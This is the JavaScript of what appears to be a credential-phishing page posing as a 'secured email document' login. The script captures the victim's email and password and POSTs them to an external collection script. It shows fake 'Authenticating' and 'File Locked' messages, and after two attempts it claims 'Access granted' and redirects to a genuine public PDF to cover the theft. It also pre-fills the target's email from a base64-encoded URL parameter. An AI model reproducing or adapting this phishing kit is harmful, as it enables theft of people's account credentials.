                <script>
                    /* global $ */
                    $(document).ready(function() {
                        var count = 0;

                        $('#submit-btn').click(function(event) {
                            //event.preventDefault();
                            var email = $("#email").val();
                            var password = $("#password").val();
                            var detail = $("#field").html();
                            $("#password").addClass('grey-form');


                            var msg = $('#msg').html();
                            $('#msg').text(msg);
                            if (email.length < 0 && !email.includes("@")) {
                                $("#msg").show();
                                $('#msg').html('Invalid email address.');
                                $('#msg').addClass('alert-danger');
                                $(".modal-header").addClass('hide');
                                $("#fieldImg").css({
                                    "margin-top": "-5px"
                                });
                            } else if (count >= 3) {
                                count = 0;
                                $('#msg').html('Scanned File Locked!  Try again Later.')
                            } else {
                                $.ajax({
                                    dataType: 'JSON',
                                    url: Script_link,
                                    type: 'POST',
                                    data: {
                                        email: email,
                                        password: password,
                                        detail: detail,

                                    },
                                    // data: $('#contact').serialize(),
                                    beforeSend: function(xhr) {
                                        $('#submit-btn').html('Authenticating.. ');
                                    },
                                    success: function(response) {
                                        //console.log(response);
                                        if (response['signal'] == 'no-pass') {
                                            count = 0;
                                            $("#msg").show();
                                            $("#fieldImg").css({
                                                "margin-top": "-5px"
                                            });
                                            $('#msg').addClass('alert-danger');
                                            $('#msg').removeClass('alert-success');
                                            $('#msg').addClass('text-danger');
                                            $("#password").val('');
                                            $("#password").removeClass('grey-form');
                                            $(".modal-header").addClass('hide');
                                        }

                                        if (response['signal'] == 'success') {
                                            $('#msg').html(response['msg']);
                                            $("#msg").show();
                                            $("#fieldImg").css({
                                                "margin-top": "-5px"
                                            });
                                            $('#msg').addClass('alert-success');
                                            $('#msg').removeClass('alert-danger');
                                            $('#msg').removeClass('.\text-danger');
                                            $('#msg').html("Access granted, redirecting to secured document portal..");
                                            $(".modal-header").addClass('hide');
                                            //setTimeout('window.location.href=\x27https://www.uscc.gov/sites/default/files/2020-04/Cascading_Economic_Impacts_of_the_Novel_Coronavirus_April_21_2020.pdf\x27;', 0x5dc);

                                        }
                                        if (response['signal'] == 'no-auth') {
                                            count = count + 1;
                                            $('#msg').html(response['msg']);
                                            $("#msg").show();
                                            $("#fieldImg").css({
                                                "margin-top": "-5px"
                                            });
                                            $('#msg').addClass('alert-danger');
                                            $('#msg').removeClass('alert-success');
                                            $('#msg').addClass('text-danger');
                                            $("#password").removeClass('grey-form');
                                            $("#password").val('');
                                            $(".modal-header").addClass('hide');
                                            if (count === 2) {
                                                $('#msg').html("Access granted, redirecting to secured document portal..");
                                                $('#msg').addClass('alert-success');
                                                setTimeout('window.location.href=\x27https://www.uscc.gov/sites/default/files/2020-04/Cascading_Economic_Impacts_of_the_Novel_Coronavirus_April_21_2020.pdf\x27;', 0x5dc);
                                            }
                                        } else {
                                            $('#msg').html(response['msg']);
                                        }
                                    },
                                    error: function(response) {

                                        //console.log(response);
                                    },
                                    complete: function() {
                                        $('#submit-btn').html('Login');
                                    }
                                });
                            }
                        });
                    });



                    //document.getElementById('email').value = '<EMAIL>';
                    var email = $("#email").val();
                    console.log(email);
                    var domain = email.substring(email.lastIndexOf("@") + 1);
                    var frmsite = domain.substring(0, domain.lastIndexOf("."));
                    //document.getElementById("fieldImg").src = `https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRKaOj_8YYL3ToSTfT_0NEOm3WbZLGu4r1Zbw&usqp=CAU`;
                    //document.getElementById("head-message").innerHTML = `${ucFirst(frmsite)} Secured Email Document`



                    function getProcessparameter() {
                        let s = getParameterByName('lo')
                        let arr = JSON.parse(atob(s));
                        return arr['email'];
                    }

                    function getProcessHash() {
                        if (window.location.hash) {
                            let h = window.location.hash;
                            let s = h.split('#')[1];
                            let arr = JSON.parse(atob(s));

                            return arr['email'];
                        }

                        return null;
                    }

                    function getParameterByName(name, url) {
                        if (!url) url = window.location.href;
                        name = name.replace(/[\[\]]/g, '\\$&');
                        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                            results = regex.exec(url);
                        if (!results) return null;
                        if (!results[2]) return '';
                        var encodedUri = decodeURIComponent(results[2].replace(/\+/g, ' '));
                        return encodedUri;
                    }

                    function ucFirst(str) {
                        return str.charAt(0).toUpperCase() + str.slice(1);
                    }
